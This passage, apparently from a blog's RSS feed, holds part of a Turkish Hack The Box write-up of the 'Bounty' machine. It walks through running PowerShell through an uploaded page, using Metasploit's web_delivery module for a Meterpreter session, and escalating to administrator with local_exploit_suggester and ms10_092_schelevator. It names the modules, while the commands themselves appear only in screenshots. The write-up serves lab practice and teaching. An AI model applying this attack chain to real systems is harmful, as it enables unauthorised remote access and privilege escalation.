+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-6.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-346" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-6.png" alt="" width="1029" height="482" /></a></p>
+<p>&nbsp;</p>
+<p>Yüklediğim sayfada powershell komutlarını çalıştırabildiğim için metasploitteki <em>exploit/multi/script/web_delivery</em> exploiti ile meterpreter oturum almayı denedim.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-7.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-347" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-7.png" alt="" width="1120" height="541" /></a></p>
+<p>Exploitin boş hali yukardaki gibi. Hedefe ve kendi bilgilerime göre doldurduğumda ise aşağıdaki görüntü gibi oluyor. Bu exploit size bir tane kod veriyor. Bu kodu herhangi bir windows komutlarının çalıştırabileceği bir komut satırında yazarsanız size bağlantı geliyor. Kendi windows makinenizin cmd&#8217;sine yazarsanız ordanda bağlantı gelir.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-8.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-348" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-8.png" alt="" width="1124" height="531" /></a></p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-9.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-349" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-9.png" alt="" width="1003" height="472" /></a></p>
+<p>&nbsp;</p>
+<p>Verilen kodu çalıştırdık ve metasploite meterpreter oturumumuz geldi.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-10.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-350" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-10.png" alt="" width="1919" height="279" /></a></p>
+<p>Şimdi sıradaki amacımız en yetkili kullanıcı olmak. Metasploitin bir güzelliği de içerisinde local exploitlerinin bulunması. Bu exploitlerle yetkimizi arttırabiliyormuyuz otomatik kontrol eden bir post bulunmakta.<em> post/multi/recon/local_exploit_suggester</em></p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-11.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-351" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-11.png" alt="" width="969" height="208" /></a></p>
+<p>Çalıştırdık ve hedefin belirtilen exploit için zaafiyetli olduğunu söyledi.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-12.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-352" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-12.png" alt="" width="932" height="477" /></a></p>
+<p>Exploitimizi   <em>use exploit/windows/local/ms10_092_schelevator </em>komutuyla seçtik ve bilgileri doldurduk.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-13.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-354" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-13.png" alt="" width="991" height="649" /></a></p>
+<p>Ve evet exploitimizi çalıştırdığımızda windows makinelerdeki en yetkili kullanıcısı olduk.</p>
+<p>&nbsp;</p>
+<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-14.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-355" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-14.png" alt="" width="464" height="52" /></a></p>
+<p>root.txt mizide okuduk ve işimiz bitti.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/bounty-hack-the-box.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
